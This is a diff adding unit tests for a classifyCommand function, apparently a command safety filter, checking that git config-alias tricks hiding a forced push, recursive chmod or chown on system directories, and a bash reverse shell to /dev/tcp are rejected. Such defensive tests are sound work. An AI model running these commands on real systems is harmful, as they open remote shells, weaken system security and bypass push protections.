@@ -1141,6 +1141,46 @@ describe("classifyCommand", () => {
     });
   });
 
+  describe("git --config-env space form (round 9)", () => {
+    test("git --config-env alias.pu=ENV pu origin main is rejected", () => {
+      expect(classifyCommand("git --config-env alias.pu=GIT_ALIAS pu origin main").ok).toBe(false);
+    });
+
+    test("git --config alias.pu=push pu --force origin main (space form)", () => {
+      expect(classifyCommand("git --config alias.pu=push pu --force origin main").ok).toBe(false);
+    });
+
+    test("git --config-env include.path=ENV fp origin (space form)", () => {
+      expect(classifyCommand("git --config-env include.path=EVIL_CFG fp origin").ok).toBe(false);
+    });
+  });
+
+  describe("symbolic chmod modes on system paths (round 9)", () => {
+    test("chmod -R a+rwx /etc is rejected", () => {
+      expect(classifyCommand("chmod -R a+rwx /etc").ok).toBe(false);
+    });
+
+    test("chmod -R ugo+rwx /usr is rejected", () => {
+      expect(classifyCommand("chmod -R ugo+rwx /usr").ok).toBe(false);
+    });
+
+    test("chmod -R g+w /etc is rejected (broad write grant)", () => {
+      expect(classifyCommand("chmod -R g+w /etc").ok).toBe(false);
+    });
+
+    test("chown -R nobody:nobody /etc is rejected (ownership change)", () => {
+      expect(classifyCommand("chown -R nobody:nobody /etc").ok).toBe(false);
+    });
+
+    test("chmod -R 755 /home is rejected (any recursive system mode)", () => {
+      expect(classifyCommand("chmod -R 755 /home").ok).toBe(false);
+    });
+
+    test("chmod -R 755 src (non-system target, allowed)", () => {
+      expect(classifyCommand("chmod -R 755 src").ok).toBe(true);
+    });
+  });
+
   describe("ClassificationResult shape", () => {
     test("blocked result has all required fields", () => {
       const result = classifyCommand("bash -i >& /dev/tcp/x/4444 0>&1");
